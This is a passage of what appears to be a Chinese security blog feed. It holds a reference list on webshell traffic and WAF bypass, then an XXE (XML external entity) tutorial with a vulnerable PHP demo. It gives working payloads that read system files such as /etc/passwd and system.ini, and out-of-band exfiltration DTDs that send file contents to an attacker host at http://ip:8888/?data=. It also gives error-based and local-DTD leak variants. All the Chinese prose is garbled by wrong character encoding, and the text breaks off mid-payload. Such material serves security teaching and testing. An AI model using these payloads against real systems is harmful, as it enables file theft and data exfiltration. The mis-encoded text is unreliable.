class="line">å¼±ç‰¹å¾ï¼šHTTP Header</span><br><span class="line">requestå’Œresponseå†…å®¹</span><br></pre></td></tr></table></figure><p>å‚è€ƒä¹‹å‰HWçœ‹çš„æ–‡ç« </p><ul><li><p>å“¥æ–¯æ‹‰</p><p><a href="https://www.freebuf.com/sectool/285693.html">ã€åŸåˆ›ã€‘å“¥æ–¯æ‹‰GodzillaåŠ å¯†æµé‡åˆ†æ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p></li><li><p>å†°è</p><p><a href="https://xz.aliyun.com/t/2744">åˆ©ç”¨åŠ¨æ€äºŒè¿›åˆ¶åŠ å¯†å®ç°æ–°å‹ä¸€å¥è¯æœ¨é©¬ä¹‹Javaç¯‡ - å…ˆçŸ¥ç¤¾åŒº</a></p><p><a href="https://www.secpulse.com/archives/195173.html">å†°èV4.0æµé‡åˆ†æåˆ°æ”»é˜²æ£€æµ‹ - SecPulse.COM | å®‰å…¨è„‰æ</a></p><p><a href="https://xz.aliyun.com/t/12453">å†°è4.0è‡ªå®šä¹‰åŠ å¯† - å…ˆçŸ¥ç¤¾åŒº</a></p></li><li><p>èšå‰‘</p><p><a href="https://www.yuque.com/antswordproject/antsword/yuakxl">https://www.yuque.com/antswordproject/antsword/yuakxl</a></p></li></ul><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://xz.aliyun.com/t/368">https://xz.aliyun.com/t/368</a></p><p><a href="https://xz.aliyun.com/t/10515">https://xz.aliyun.com/t/10515</a></p><p>[Bypass WAF Cookbook - MayIKissYou](<a href="https://wooyun.js.org/drops/Bypass">https://wooyun.js.org/drops/Bypass</a> WAF Cookbook.html)</p><p><a href="https://www.anquanke.com/post/id/203880">https://www.anquanke.com/post/id/203880</a></p><p><a href="https://xz.aliyun.com/t/11607#toc-1">ç„æ­¦ç›¾çš„å‡ ç§ç»•è¿‡å§¿åŠ¿ - å…ˆçŸ¥ç¤¾åŒº</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XXE</title>
      <link href="/2023/06/01/XXE/"/>
      <url>/2023/06/01/XXE/</url>
      
        <content type="html"><![CDATA[<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><ol><li><p>å®šä¹‰</p><blockquote><p>XMLæ˜¯å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆeXtensible Markup Languageï¼‰çš„ç¼©å†™ï¼Œå®ƒæ˜¯æ˜¯ä¸€ç§æ•°æ®è¡¨ç¤ºæ ¼å¼ï¼Œå¯ä»¥æè¿°éå¸¸ å¤æ‚çš„æ•°æ®ç»“æ„ï¼Œå¸¸ç”¨äºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ã€‚</p></blockquote></li><li><p>ä¸htmlçš„è”ç³»å’ŒåŒºåˆ«</p><ul><li>HTML è¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®</li><li>XML è¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®</li></ul><blockquote><p>å¯¹ XML æœ€å¥½çš„æè¿°æ˜¯ï¼š</p><p><strong>XML æ˜¯ç‹¬ç«‹äºè½¯ä»¶å’Œç¡¬ä»¶çš„ä¿¡æ¯ä¼ è¾“å·¥å…·ã€‚</strong></p></blockquote></li><li><p>è¯­æ³•</p><p><img src="/../images/image-20220804165043284-1686034515882.png" alt="image-20220804165043284"></p></li><li><p>æ ¼å¼</p><ul><li><p>XMLå£°æ˜ï¼šç‰ˆæœ¬ï¼Œç¼–ç ä¿¡æ¯ï¼ˆå¯é€‰ï¼Œå¦‚æœå­˜åœ¨å°±å¿…é¡»æ”¾åœ¨æ–‡æ¡£çš„é¦–è¡Œï¼‰</p></li><li><p>DTD:Document Type Definition å³æ–‡æ¡£ç±»å‹å®šä¹‰ (å¯é€‰)</p></li><li><p>æ–‡æ¡£å…ƒç´ </p></li><li><p>å…¸å‹xmlæ–‡æ¡£ä¾‹å­</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> <span class="comment">&lt;!--XMLå£°æ˜--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--DTDï¼Œè¿™éƒ¨åˆ†å¯é€‰çš„--&gt;</span>          </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--æ–‡æ¡£å…ƒç´ --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804155703432-1686034515883.png" alt="image-20220804155703432"></p></li></ul></li></ol><h2 id="DTDä¸å®ä½“"><a href="#DTDä¸å®ä½“" class="headerlink" title="DTDä¸å®ä½“"></a>DTDä¸å®ä½“</h2><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><blockquote><p>DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„ä½œç”¨æ˜¯å®šä¹‰ XML æ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€‚DTD å¯ä»¥åœ¨ XML æ–‡æ¡£å†…å£°æ˜ï¼Œä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ã€‚</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY b &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ‰€ç¤ºçš„å°±æ˜¯ä¸€ä¸ªDTD</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    &lt;!ENTITY b system &quot;å¤–éƒ¨dtdåœ°å€&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ‰€ç¤ºçš„å°±æ˜¯ä¸€ä¸ªå¤–éƒ¨DTD</p><h3 id="å®ä½“"><a href="#å®ä½“" class="headerlink" title="å®ä½“"></a>å®ä½“</h3><blockquote><p>DTDå®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå¯ä»¥å†…éƒ¨å£°æ˜æˆ–å¤–éƒ¨å¼•ç”¨ã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY hello &quot;hello world&quot; &gt; </span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;foo&gt;&amp;hello&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>æ–‡æ¡£å…ƒç´ å¯ä»¥ä½¿ç”¨&amp;æ¥å¼•ç”¨å®ä½“çš„å€¼ï¼Œ<code>&amp;hello</code>å°†è¢«æ›¿æ¢ä¸º<code>hello world</code></p><h4 id="å‚æ•°å®ä½“"><a href="#å‚æ•°å®ä½“" class="headerlink" title="å‚æ•°å®ä½“"></a>å‚æ•°å®ä½“</h4><p>XMLå‚æ•°å®ä½“æ˜¯ä¸€ç§ç‰¹æ®Šçš„XMLå®ä½“ï¼Œåªèƒ½åœ¨DTDä¸­çš„å…¶ä»–åœ°æ–¹å¼•ç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY % b &quot;&lt;!ENTITY b1 &quot;awsl&quot;&gt;&quot;&gt;</span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å‚æ•°å®ä½“ç”¨<code>% name</code>å£°æ˜ï¼Œå¼•ç”¨æ—¶ç”¨<code>%name;</code></p><h4 id="å¼•å…¥å¤–éƒ¨å®ä½“"><a href="#å¼•å…¥å¤–éƒ¨å®ä½“" class="headerlink" title="å¼•å…¥å¤–éƒ¨å®ä½“"></a>å¼•å…¥å¤–éƒ¨å®ä½“</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; </span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨äº†fileåè®®æ¥å¼•å…¥å¤–éƒ¨å®ä½“ï¼Œå®é™…ä¸Šè¿˜èƒ½æ”¯æŒå¦‚ä¸‹åè®®ï¼Œè¿™ä¹Ÿæ˜¯xxeæ¼æ´å½¢æˆçš„åŸå› </p><p><img src="/../images/1270588-20200115235522292-2141935835.png" alt="img"></p><p><img src="/../images/20181120002647-e965b74c-ec17-1.png" alt="20181120002647-e965b74c-ec17-1"></p><h1 id="XXEæ¼æ´"><a href="#XXEæ¼æ´" class="headerlink" title="XXEæ¼æ´"></a>XXEæ¼æ´</h1><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>XXE æ¼æ´å…¨ç§° XML External Entity Injectionï¼Œå³ xml å¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´</p><h2 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h2><p>XXE æ¼æ´å‘ ç”Ÿåœ¨<strong>åº”ç”¨ç¨‹åºè§£æ XML è¾“å…¥æ—¶</strong>ï¼Œæ²¡æœ‰ç¦æ­¢<strong>å¤–éƒ¨å®ä½“</strong>çš„åŠ è½½ï¼Œè€Œå¤–éƒ¨å®ä½“çš„å¼•ç”¨å¯æ”¯æŒhttpï¼Œfileç­‰åè®®ï¼Œé€šè¿‡åˆ©ç”¨è¿™äº›åè®®è¿›è¡Œæ”»å‡»ã€‚</p><p><img src="/../images/1270588-20200115235522292-2141935835.png" alt="img"></p><p><img src="/../images/20181120002647-e965b74c-ec17-1.png" alt="20181120002647-e965b74c-ec17-1"></p><h2 id="æ¼æ´æ£€æµ‹"><a href="#æ¼æ´æ£€æµ‹" class="headerlink" title="æ¼æ´æ£€æµ‹"></a>æ¼æ´æ£€æµ‹</h2><h3 id="é»‘ç›’"><a href="#é»‘ç›’" class="headerlink" title="é»‘ç›’"></a>é»‘ç›’</h3><ul><li><p>æ•°æ®åŒ…ä¸­çš„content-type</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">application/xml</span><br><span class="line">text/xml</span><br></pre></td></tr></table></figure></li><li><p>http body</p><p><img src="/../images/image-20230605180133052-1686034648311.png" alt="image-20230605180133052"></p></li><li><p>æ•°æ®åŒ…è¯·æ±‚å¤´ä¸­Context-Typeçš„å€¼ä¸ºapplication&#x2F;jsonï¼Œæ›´æ”¹ä¸ºapplication&#x2F;xmlæˆ–è€…text&#x2F;xmlï¼Œç„¶åæ’å…¥payloadæµ‹è¯•</p></li></ul><h3 id="ç™½ç›’"><a href="#ç™½ç›’" class="headerlink" title="ç™½ç›’"></a>ç™½ç›’</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">simplexml_import_dom</span>()</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯PHPæ˜¯ä½¿ç”¨libxmlæ¥è§£æXMLçš„ï¼Œä½†æ˜¯<strong>libxml2.9.0</strong>å¼€å§‹å°±é»˜è®¤ä¸è§£æå¤–éƒ¨å®ä½“ï¼Œè‡ªç„¶å°±ä¸å­˜åœ¨xxeæ¼æ´ã€‚</p><h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilder</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">javax.xml.parsers.SAXParserFactory</span><br><span class="line">javax.xml.transform.TransformerFactory</span><br><span class="line">javax.xml.validation.Validator</span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory</span><br><span class="line">javax.xml.transform.sax.SAXSource</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">org.xml.sax.helpers.XMLReaderFactory</span><br><span class="line">org.dom4j.io.SAXReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XpathExpression</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.apache.commons.digester3.Digester</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´å±å®³"><a href="#æ¼æ´å±å®³" class="headerlink" title="æ¼æ´å±å®³"></a>æ¼æ´å±å®³</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ–‡ä»¶è¯»å–</span><br><span class="line">å†…ç½‘æ¢é’ˆ</span><br><span class="line">æ‹’ç»æœåŠ¡æ”»å‡»</span><br><span class="line">å‘½ä»¤æ‰§è¡Œ</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h3><ul><li><a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a> phpç‰ˆæœ¬</li><li>vulhub Apache solr XML å®ä½“æ³¨å…¥æ¼æ´ï¼ˆCVE-2017-12629ï¼‰</li></ul><h3 id="æœ‰å›æ˜¾"><a href="#æœ‰å›æ˜¾" class="headerlink" title="æœ‰å›æ˜¾"></a>æœ‰å›æ˜¾</h3><p>Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>username</code>ä¸ºå›æ˜¾ä½</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; </span><br><span class="line">]&gt;                                                         </span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="æ— å›æ˜¾"><a href="#æ— å›æ˜¾" class="headerlink" title="æ— å›æ˜¾"></a>æ— å›æ˜¾</h3><h4 id="å¤–å¸¦"><a href="#å¤–å¸¦" class="headerlink" title="å¤–å¸¦"></a>å¤–å¸¦</h4><p>php:&#x2F;&#x2F;filterè¯»å–å¯¹æ–¹æœåŠ¡å™¨æ–‡ä»¶å†…å®¹â†’å¼•å…¥å¤–éƒ¨å®ä½“ï¼ˆæ”»å‡»æœåŠ¡å™¨ä¸Šçš„ï¼‰â†’è§¦å‘å¤–éƒ¨å®ä½“ä¸­çš„å†™å…¥ä»£ç ï¼Œå°†è¯»å–åˆ°çš„æ–‡ä»¶å†…å®¹èµ‹å€¼ç»™æŒ‡å®šå‚æ•°â†’æ¥æ”¶å‚æ•°ï¼Œåœ¨æ”»å‡»æœåŠ¡å™¨ç›‘å¬æˆ–è€…æŸ¥çœ‹æ—¥å¿—ï¼Œä»è€Œè·å–åˆ°å¯¹æ–¹æœåŠ¡å™¨æ–‡ä»¶å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///e:/test.txt&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://ip:8000/test.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--test.dtd--&gt;</span><br><span class="line">&lt;!ENTITY % payload</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://ip:8888/?data=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼štest.dtdçš„å†…å®¹ï¼Œå†…éƒ¨çš„%å·è¦è¿›è¡Œå®ä½“ç¼–ç æˆ&amp;#x25ï¼ˆå› ä¸ºå®ä½“çš„å€¼ä¸­ä¸èƒ½æœ‰ %, æ‰€ä»¥å°†å…¶è½¬æˆhtmlå®ä½“ç¼–ç  <code>%</code>ï¼‰</p></blockquote><p><img src="/../images/image-20230605192212337.png" alt="image-20230605192212337"></p><h4 id="åŸºäºæŠ¥é”™"><a href="#åŸºäºæŠ¥é”™" class="headerlink" title="åŸºäºæŠ¥é”™"></a>åŸºäºæŠ¥é”™</h4><p>æ„é€ ä¸€ä¸ªé”™è¯¯çš„urlå¹¶å°†æ³„éœ²æ–‡ä»¶å†…å®¹æ”¾åœ¨urlä¸­ï¼Œé€šè¿‡è¿™æ ·çš„æ–¹å¼è¿”å›æ•°æ®ã€‚</p><h5 id="å¼•å…¥æœåŠ¡å™¨å®ä½“"><a href="#å¼•å…¥æœåŠ¡å™¨å®ä½“" class="headerlink" title="å¼•å…¥æœåŠ¡å™¨å®ä½“"></a>å¼•å…¥æœåŠ¡å™¨å®ä½“</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % xxe SYSTEM &quot;http://ip:8000/xml.dtd&quot;&gt; </span><br><span class="line">    %xxe;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>xml.dtd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--é€šè¿‡æ‰§è¡Œerrorå®ä½“ï¼Œä»¥ä¾¿é€šè¿‡å°è¯•åŠ è½½ä¸å­˜åœ¨çš„æ–‡ä»¶æ¥å¸¦å‡ºç›®æ ‡æ–‡ä»¶çš„å€¼ï¼Œä»è€Œç”ŸæˆåŒ…å«ä¸å­˜åœ¨æ–‡ä»¶çš„åç§°çš„é”™è¯¯æ¶ˆæ¯ï¼Œè¯¥æ–‡ä»¶æ˜¯/etc/passwdæ–‡ä»¶çš„å†…å®¹--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230606142023880.png" alt="image-20230606142023880"></p><h5 id="å¼•å…¥æœ¬åœ°ç³»ç»Ÿæ–‡ä»¶â€“æµ‹è¯•å¤±è´¥"><a href="#å¼•å…¥æœ¬åœ°ç³»ç»Ÿæ–‡ä»¶â€“æµ‹è¯•å¤±è´¥" class="headerlink" title="å¼•å…¥æœ¬åœ°ç³»ç»Ÿæ–‡ä»¶â€“æµ‹è¯•å¤±è´¥"></a>å¼•å…¥æœ¬åœ°ç³»ç»Ÿæ–‡ä»¶â€“æµ‹è¯•å¤±è´¥</h5><p><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:/Windows/System32/wbem/xml/cim20.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % SuperClass &#x27;</span><br><span class="line">         &gt;Your DTD code&lt;!ENTITY test &quot;test&quot;</span><br><span class="line">        &#x27;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>DTD code</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:/Windows/System32/wbem/xml/cim20.dtd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY % SuperClass &#x27;&gt;</span><br><span class="line">         &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error; &lt;!ENTITY test &quot;test&quot;</span><br><span class="line">        &#x27;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h5 id="åµŒå¥—å‚æ•°å®ä½“"><a href="#åµŒå¥—å‚æ•°å®ä½“" class="headerlink" title="åµŒå¥—å‚æ•°å®ä½“"></a>åµŒå¥—å‚æ•°å®ä½“</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ELEMENT message ANY&gt;</span><br><span class="line">    &lt;!ENTITY % para1 SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % para &#x27;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;para2;</span><br><span class="line">    &#x27;&gt;</span><br><span class="line">    %para;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230605210541295.png" alt="image-20230605210541295"></p><p>ä¸æ˜¯æ‰€æœ‰çš„xmlè§£æå™¨éƒ½èƒ½è§£æåµŒå¥—å‚æ•°å®ä½“</p><p><img src="/../images/image-20230606151226408.png" alt="image-20230606151226408"></p><h3 id="åˆ©ç”¨æ–¹å¼"><a href="#åˆ©ç”¨æ–¹å¼" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h3><h4 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        </span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;file:///æ–‡ä»¶è·¯å¾„&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!-- ä½¿ç”¨phpçš„filterè¿‡æ»¤å™¨è¯»å–å«æœ‰xmlä¿ç•™å­—ç¬¦çš„æ–‡ä»¶ --&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY  rabbit SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///e:/test.txt&quot;&gt;]&gt; </span><br><span class="line"></span><br><span class="line">&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230605193428910.png" alt="image-20230605193428910"></p><p>å½“ä¸èƒ½ä½¿ç”¨è¿‡æ»¤å™¨æ—¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///f:/test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  